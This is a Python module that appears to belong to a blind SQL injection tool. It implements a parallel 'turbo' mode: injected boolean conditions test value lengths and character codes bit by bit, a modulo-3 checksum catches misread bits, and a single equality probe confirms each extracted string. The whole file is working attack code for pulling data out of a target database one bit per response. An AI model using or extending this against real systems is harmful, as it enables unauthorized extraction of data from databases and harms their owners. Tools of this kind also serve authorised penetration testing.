from __future__ import annotations

import threading
from collections.abc import Callable
from concurrent.futures import Future, ThreadPoolExecutor, as_completed
from dataclasses import dataclass

from .dialects import sql_literal
from .extractor_common import job_activity
from .inference_scheduler import InferenceSchedulingMixin
from .models import ExtractionJob


@dataclass(frozen=True, slots=True)
class _ProbeTask:
    key: str
    kind: str
    value: int
    condition: str
    operation: str
    target: str
    detail: str


class TurboSchedulingMixin(InferenceSchedulingMixin):
    """Breadth-first bit-plane inference with modular error detection.

    Boolean SQL injection exposes one bit of information per response. Turbo mode
    therefore reduces dependency depth instead of pretending that fewer than
    log2(N) boolean decisions can identify an N-value alphabet. Independent bits,
    lengths, entities, and character positions are scheduled in global waves.

    A modulo-3 residue detects every single flipped binary bit because powers of
    two are never divisible by three. Exact whole-value confirmation then replaces
    one equality request per character with one request per identifier. Any
    inconsistency falls back to the existing robust inference path.
    """

    @staticmethod
    def _bit_count(maximum: int) -> int:
        return max(1, maximum.bit_length())

    @staticmethod
    def _residue_conditions(expression: str) -> tuple[str, str]:
        value = f"COALESCE(({expression}), 0)"
        return (
            f"(({value}) % 3) = 0",
            f"(({value}) % 3) = 1",
        )

    def _run_probe_tasks(
        self,
        tasks: list[_ProbeTask],
    ) -> dict[tuple[str, str, int], bool]:
        if not tasks:
            return {}
        workers = min(self.config.workers, len(tasks))
        used_workers: set[str] = set()
        used_lock = threading.Lock()
        results: dict[tuple[str, str, int], bool] = {}

        def run(task: _ProbeTask) -> bool:
            result = self._execute_worker_task(
                used_workers,
                used_lock,
                task.operation,
                task.target,
                task.detail,
                self.probe_condition,
                task.condition,
            )
            return result.matched

        try:
            with ThreadPoolExecutor(
                max_workers=workers,
                thread_name_prefix="sqliblind-turbo",
            ) as executor:
                futures: dict[Future[bool], _ProbeTask] = {
                    executor.submit(run, task): task for task in tasks
                }
                for future in as_completed(futures):
                    task = futures[future]
                    results[(task.key, task.kind, task.value)] = future.result()
        finally:
            self._finish_worker_activities(used_workers)
        return results

    @staticmethod
    def _decode_residue(
        zero: bool,
        one: bool,
    ) -> int | None:
        if zero and one:
            return None
        if zero:
            return 0
        if one:
            return 1
        return 2

    def infer_many_integers_capped(
        self,
        expressions: dict[str, str],
        maximum: int,
    ) -> dict[str, tuple[int, bool]]:
        """Infer many bounded integers using globally scheduled bit planes."""
        if maximum < 0:
            raise ValueError("maximum cannot be negative")
        if not expressions:
            return {}
        if self.inference_mode != "turbo" or not self.parallel_characters:
            items = list(expressions.items())
            values = self._parallel_map(
                items,
                lambda item: self.infer_integer_capped(item[1], maximum),
                activity_factory=lambda item, _index: (
                    "Infer bounded integer",
                    item[0],
                    f"searching 0..{maximum}",
                ),
            )
            return {
                key: value
                for (key, _expression), value in zip(items, values, strict=True)
            }

        tasks: list[_ProbeTask] = []
        bits = self._bit_count(maximum)
        for key, expression in expressions.items():
            normalized = f"COALESCE(({expression}), 0)"
            tasks.append(
                _ProbeTask(
                    key,
                    "overflow",
                    0,
                    f"({normalized}) > {maximum}",
                    "Infer bounded integer",
                    key,
                    f"checking configured maximum {maximum}",
                )
            )
            for bit in range(bits):
                mask = 1 << bit
                tasks.append(
                    _ProbeTask(
                        key,
                        "bit",
                        mask,
                        f"(({normalized}) & {mask}) <> 0",
                        "Infer bounded integer",
                        key,
                        f"probing bit {bit + 1}/{bits}",
                    )
                )
            for residue, condition in enumerate(
                self._residue_conditions(expression)
            ):
                tasks.append(
                    _ProbeTask(
                        key,
                        "residue",
                        residue,
                        condition,
                        "Verify bounded integer",
                        key,
                        f"checking modulo-3 residue {residue}",
                    )
                )

        self._metric(
            "vector_integer_probes",
            sum(task.kind in {"bit", "overflow"} for task in tasks),
        )
        self._metric(
            "checksum_probes",
            sum(task.kind == "residue" for task in tasks),
        )
        probed = self._run_probe_tasks(tasks)
        resolved: dict[str, tuple[int, bool]] = {}
        for key, expression in expressions.items():
            if probed[(key, "overflow", 0)]:
                resolved[key] = maximum, True
                continue
            candidate = 0
            for bit in range(bits):
                mask = 1 << bit
                if probed[(key, "bit", mask)]:
                    candidate |= mask
            residue = self._decode_residue(
                probed[(key, "residue", 0)],
                probed[(key, "residue", 1)],
            )
            consistent = (
                residue is not None
                and 0 <= candidate <= maximum
                and candidate % 3 == residue
            )
            if consistent:
                resolved[key] = candidate, False
                continue
            self._metric("checksum_fallbacks")
            resolved[key] = self.infer_integer_capped(expression, maximum)
        return resolved

    def _build_character_tasks(
        self,
        jobs: list[ExtractionJob],
        lengths: list[tuple[int, bool]],
    ) -> tuple[list[_ProbeTask], dict[tuple[int, int], str]]:
        bits = self._bit_count(self.config.max_char_code)
        tasks: list[_ProbeTask] = []
        expressions: dict[tuple[int, int], str] = {}
        for index, job in enumerate(jobs):
            operation, target = job_activity(job)
            length = lengths[index][0]
            for offset in range(length):
                position = offset + 1
                code_expression = self.dialect.char_code_expression(
                    job.expression,
                    position,
                )
                expressions[(index, offset)] = code_expression
                key = f"{index}:{offset}"
                for bit in range(bits):
                    mask = 1 << bit
                    tasks.append(
                        _ProbeTask(
                            key,
                            "bit",
                            mask,
                            f"(({code_expression}) & {mask}) <> 0",
                            operation,
                            target,
                            f"character {position}/{length} · bit {bit + 1}/{bits}",
                        )
                    )
                for residue, condition in enumerate(
                    self._residue_conditions(code_expression)
                ):
                    tasks.append(
                        _ProbeTask(
                            key,
                            "residue",
                            residue,
                            condition,
                            operation,
                            target,
                            f"character {position}/{length} · residue {residue}",
                        )
                    )
        return tasks, expressions

    def _recover_turbo_position(
        self,
        code_expression: str,
        position: int,
        candidate: int,
        residue: int | None,
    ) -> int:
        in_range = (
            self.config.min_char_code
            <= candidate
            <= self.config.max_char_code
        )
        if in_range and residue is not None and candidate % 3 == residue:
            return candidate
        self._metric("checksum_fallbacks")
        return self._recover_character(code_expression, position)

    def _confirm_turbo_job(
        self,
        job: ExtractionJob,
        value: str,
        truncated: bool,
    ) -> bool:
        if truncated:
            return False
        self._metric("batch_confirmations")
        condition = (
            f"({self.dialect.text_expression(job.expression)}) = "
            f"{sql_literal(value)}"
        )
        return self.probe_condition(condition).matched

    def _extract_jobs(
        self,
        jobs: list[ExtractionJob],
        *,
        maximum_length: int,
        on_result: Callable[[ExtractionJob, str], None] | None,
    ) -> dict[str, str]:
        if self.inference_mode != "turbo" or not self.parallel_characters:
            return super()._extract_jobs(
                jobs,
                maximum_length=maximum_length,
                on_result=on_result,
            )
        if not jobs:
            return {}

        activities = [
            self._start_batch_activity(job, index)
            for index, job in enumerate(jobs)
        ]
        try:
            length_expressions = {
                str(index): self.dialect.length_expression(job.expression)
                for index, job in enumerate(jobs)
            }
            length_values = self.infer_many_integers_capped(
                length_expressions,
                maximum_length,
            )
            lengths = [length_values[str(index)] for index in range(len(jobs))]
            for index, (length, _truncated) in enumerate(lengths):
                activities[index]["detail"] = f"length resolved: {length}"
                self._emit(
                    "activity.updated",
                    activity=self._activity_payload(activities[index]),
                )

            tasks, code_expressions = self._build_character_tasks(jobs, lengths)
            self._metric(
                "bit_probes",
                sum(task.kind == "bit" for task in tasks),
            )
            self._metric(
                "checksum_probes",
                sum(task.kind == "residue" for task in tasks),
            )
            probed = self._run_probe_tasks(tasks)
            bit_count = self._bit_count(self.config.max_char_code)
            codes: list[list[int]] = [
                [0] * length for length, _truncated in lengths
            ]

            for index, values in enumerate(codes):
                for offset in range(len(values)):
                    key = f"{index}:{offset}"
                    candidate = 0
                    for bit in range(bit_count):
                        mask = 1 << bit
                        if probed[(key, "bit", mask)]:
                            candidate |= mask
                    residue = self._decode_residue(
                        probed[(key, "residue", 0)],
                        probed[(key, "residue", 1)],
                    )
                    codes[index][offset] = self._recover_turbo_position(
                        code_expressions[(index, offset)],
                        offset + 1,
                        candidate,
                        residue,
                    )
                    self._update_batch_activity(
                        activities[index],
                        offset + 1,
                        len(values),
                    )

            results: dict[str, str] = {}
            for index, job in enumerate(jobs):
                raw_value = "".join(chr(code) for code in codes[index])
                truncated = lengths[index][1]
                confirmed = self._confirm_turbo_job(
                    job,
                    raw_value,
                    truncated,
                )
                if confirmed:
                    for code in codes[index]:
                        self._record_code(code)
                        self._metric("characters")
                else:
                    if not truncated:
                        self._metric("checksum_fallbacks")
                    for offset, candidate in enumerate(codes[index]):
                        expression = code_expressions[(index, offset)]
                        if self._confirm_candidate(expression, candidate):
                            self._record_code(candidate)
                            self._metric("characters")
                            continue
                        codes[index][offset] = self._recover_character(
                            expression,
                            offset + 1,
                        )
                    raw_value = "".join(chr(code) for code in codes[index])

                value = raw_value + ("…" if truncated else "")
                results[job.key] = value
                if on_result is not None:
                    on_result(job, value)
                self._finish_batch_activity(activities[index])
            return results
        except Exception as exc:
            for activity in activities:
                if activity.get("status") not in {"completed", "failed"}:
                    self._finish_batch_activity(activity, failed=str(exc))
            raise


__all__ = ["TurboSchedulingMixin"]
